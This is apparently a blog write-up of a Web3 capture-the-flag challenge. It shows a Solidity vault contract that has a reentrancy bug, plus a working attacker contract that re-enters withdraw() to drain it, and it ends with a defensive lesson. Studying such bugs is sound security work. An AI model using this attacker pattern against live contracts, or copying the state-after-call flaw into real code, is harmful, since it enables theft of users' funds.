---
title: "Web3 CTF Writeup: Reentrancy Gone Wrong"
date: 2026-03-10
draft: false
categories:
  - security
tags:
  - ctf
  - web3
summary: "A walkthrough of a reentrancy vulnerability in a Solidity CTF challenge and how I exploited it to drain the contract."
---

## Challenge Overview

This challenge presented a simple Ethereum vault contract that allowed users to deposit and withdraw ETH. At first glance it looked secure — but a classic reentrancy bug lurked inside.

## The Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0; // state update AFTER external call = bad
    }
}
```

The state update happens **after** the external call — a textbook reentrancy setup.

## Exploit

I wrote an attacker contract that calls back into `withdraw()` before the balance is zeroed out:

```solidity
contract Attacker {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() public payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw();
        }
    }
}
```

## Key Takeaway

Always follow the **Checks-Effects-Interactions** pattern. Update state before making external calls. OpenZeppelin's `ReentrancyGuard` is your friend.
